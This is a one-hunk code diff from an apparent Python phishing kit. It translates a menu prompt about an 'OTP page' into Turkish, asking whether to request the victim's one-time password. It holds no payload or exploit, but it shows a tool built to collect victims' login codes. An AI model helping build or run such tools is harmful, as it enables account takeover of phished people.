@@ -1274,7 +1274,7 @@ def main_menu():
             if folder == "custom" and mask == "custom":
                 customdir = customfol()
             if otp_folder != "":
-                is_otp = input(f"\n{ask}Do you want OTP Page? [y/n] > {green}")
+                is_otp = input(f"\n{ask}KURBANDAN OTP ŞİFRESİ SORULSUN MU ? Y/N {green}")
                 if is_otp == "y":
                     folder = otp_folder
             break
